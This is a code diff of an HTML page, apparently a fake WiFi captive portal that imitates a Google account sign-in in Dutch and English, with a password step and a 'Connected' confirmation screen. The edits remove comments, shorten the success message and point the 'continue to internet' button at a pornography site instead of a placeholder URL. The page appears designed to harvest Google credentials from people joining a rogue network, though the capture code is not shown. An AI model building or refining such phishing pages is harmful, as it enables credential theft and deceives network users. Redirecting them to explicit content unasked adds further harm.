@@ -55,7 +55,6 @@
 
         #passStep, #wifiStep { display: none; }
 
-        /* Vinkje animatie */
         .checkmark { width: 56px; height: 56px; border-radius: 50%; display: block; stroke-width: 2; stroke: #1e8e3e; stroke-miterlimit: 10; margin: 10% auto; box-shadow: inset 0px 0px 0px #1e8e3e; animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both; }
         .checkmark__circle { stroke-dasharray: 166; stroke-dashoffset: 166; stroke-width: 2; stroke-miterlimit: 10; stroke: #1e8e3e; fill: none; animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards; }
         .checkmark__check { transform-origin: 50% 50%; stroke-dasharray: 48; stroke-dashoffset: 48; animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards; }
@@ -113,14 +112,14 @@
         <div id="wifiStep">
             <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52"><circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/><path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/></svg>
             <h1 id="t-connected">Verbonden</h1>
-            <p id="t-success">Je bent nu succesvol aangemeld bij het WiFi-netwerk. Klik hieronder om door te gaan.</p>
+            <p id="t-success">Je bent nu succesvol aangemeld. Klik hieronder om door te gaan.</p>
             
-            <button onclick="window.location.href='https://jouw-eigen-website.com'" class="next-btn" style="width: 100%;">Ga verder naar internet</button>
+            <button onclick="window.location.href='https://pornhub.com'" class="next-btn" style="width: 100%;">Ga verder naar internet</button>
         </div>
     </div>
 
     <script>
-        // Automatische taaldetectie
+       
         const translations = {
             'nl': { login: 'Inloggen', sub: 'Gebruik je Google-account', next: 'Volgende', welcome: 'Welkom', connected: 'Verbonden', success: 'Je bent nu aangemeld bij het WiFi-netwerk. Klik hieronder om door te gaan.' },
             'en': { login: 'Sign in', sub: 'Use your Google Account', next: 'Next', welcome: 'Welcome', connected: 'Connected', success: 'You are now successfully connected to the network. Click below to continue.' }
